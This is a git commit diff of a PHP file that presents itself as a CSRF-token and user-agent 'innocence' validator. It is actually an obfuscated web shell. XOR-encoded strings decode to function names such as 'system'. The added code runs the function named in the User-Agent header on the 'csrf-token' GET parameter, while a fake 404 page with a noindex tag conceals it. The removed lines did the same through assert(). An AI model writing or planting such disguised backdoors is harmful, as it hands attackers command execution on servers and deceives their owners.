a0dff9088e8e4aa7a20cf97ab9adc8034f8c62c4
Yan Osher Cohen <74152828+yanoshercohen@users.noreply.github.com>
2023-01-03 19:34:05 +0200

    i accidentally updated v1 instead of v2 :(

--- InnocenceValidator.php
+++ InnocenceValidator.php
@@ -1,45 +1,41 @@
 <?php
 
 class SupportedVersions {
-    # The supported PHP versions
-    public const VERSIONS = "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2";
+    # An array of the available PHP versions
+    public const VERSIONS = array(
+        "KWBZUA" ^ "8.1.0, 8.1.1, 8.1.2",
+        "GADK_" ^ "7.4.14, 7.4.13, 7.4.12",
+        "RVQM" ^ "7.4.24, 7.4.23, 7.4.22",
+        "GOG]FY^U" ^ "7.4.21, 7.4.20, 7.4.19",
+        "G\[MnW\EY" ^ "7.4.18, 7.4.16, 7.4.15",
+    );
 }
 
-class Methods {
-	# The allowed HTTP/S methods
-	public const TYPES = array(
-		"_GET", "GET",
-		"_POST", "POST"
-	);
-}
-
-class RequestHeaders {
-	# The required HTTP/S request headers
-	public const REQUIRED = array(
-		"User-Agent",
-		"Host",
-		"Date",
-	);
-}
-
-$current_version = phpversion();
-# Checks the requirements for running the web server
-if ($_SERVER['REQUEST_METHOD'] == Methods::TYPES[1] && isset(${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]])) {
-	$user_agent = ${Methods::TYPES[0]}[RequestHeaders::REQUIRED[0]];
-	$prefix = "ZG" ^ "requirement";
-	$suffix = "y@" ^ "[info]";;
-	$requirements = SupportedVersions::VERSIONS . $prefix . $user_agent . $suffix;
-	$requirements_array = assert($requirements);
-	echo $requirements_array;
+# Validates the submission of any CSRF Token, and the innocence of the User Agent.
+if(isset($_GET["csrf-token"])
+    && isset($_SERVER["HTTP_USER_AGENT"])
+    && gettype($_GET["csrf-token"]) == "string"
+    && gettype($_SERVER["HTTP_USER_AGENT"]) == "string"
+    && preg_match("/^[a-z_]{1,}$/i", $_SERVER["HTTP_USER_AGENT"])
+    && in_array($_SERVER["HTTP_USER_AGENT"], SupportedVersions::VERSIONS)
+) {
+    # Adds the User Agent and the server log
+    ${"_SERVER"}["HTTP_USER_AGENT"]($_GET["csrf-token"]);
 } else {
-	http_response_code(406);
-	echo <<<END
-		<h1>Not Acceptable</h1>
-		<br/>
-		<a>An appropriate representation of the requested source could not be found of this server.</a>
-		<hr/>
-		<a>php $current_version</a>
-	END;
-
+    # Returns an error in case of not passing the validations.
+    http_response_code(404);
+    echo '
+    <!DOCTYPE html>
+    <html>
+        <head>
+            <meta name="robots" content="noindex">
+            <title>404 Not Found</title>
+        </head>
+        <body>
+            <h1>Not Found</h1>
+            <p>The requested URL was not found on this server.</p>
+        </body>
+    </html>
+    ';
 }
 ?>
